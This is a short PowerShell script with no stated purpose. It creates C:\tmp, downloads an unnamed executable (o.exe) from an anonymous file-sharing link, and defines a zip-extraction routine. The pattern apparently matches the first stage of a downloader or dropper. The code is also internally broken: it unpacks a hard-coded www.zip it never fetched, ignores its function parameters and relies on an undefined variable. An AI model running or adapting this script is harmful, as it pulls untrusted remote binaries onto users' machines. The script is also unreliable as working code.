mkdir C:\tmp
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest https://dl.uploadgram.me/6268d32a603d1h?raw -OutFile C:\tmp\o.exe
cd C:\tmp
function unzip ($archive, $destination) {
    $shell = new-object -com shell.application
    $zip = $shell.NameSpace("C:\tmp\www.zip")
    foreach($item in $zip.items())
    {
        $TestItem = Join-Path -Path C:\tmp\ -ChildPath $item.Name
        if (Test-Path -Path $TestItem){Remove-Item $TestItem}
        $shell.Namespace("C:\tmp\").copyhere($item)
    }
}
 
Get-ChildItem $dir_work -Filter '*.zip' | foreach {unzip $_.fullname $dir_work}

